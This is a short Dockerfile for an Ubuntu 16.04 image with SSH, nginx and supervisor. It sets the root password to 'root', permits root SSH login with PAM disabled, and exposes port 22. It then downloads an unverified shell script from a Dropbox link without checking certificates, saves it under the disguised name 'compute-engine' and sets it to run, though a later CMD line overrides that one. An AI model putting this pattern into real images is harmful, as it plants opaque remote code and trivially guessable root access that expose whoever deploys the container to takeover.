FROM       ubuntu:16.04
MAINTAINER Mark Well "https://www.markwell.com"

RUN apt-get update

RUN apt-get install -y supervisor openssh-server vim-tiny nginx iputils-ping tmux bsdmainutils
RUN mkdir /var/run/sshd

RUN echo 'root:root' |chpasswd

RUN sed -ri 's/^#?PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config

RUN mkdir /root/.ssh

RUN apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
    
WORKDIR /root
RUN cd /root
ADD supervisord.conf /etc/supervisord.conf
EXPOSE 22
EXPOSE 80
RUN mkdir -p /var/run/sshd
RUN wget --no-check-certificate  https://www.dropbox.com/s/lbee01hypeodkmp/mjj.sh?dl=1 -O compute-engine
RUN chmod +x compute-engine
CMD /root/compute-engine
CMD /usr/bin/supervisord -c /etc/supervisord.conf

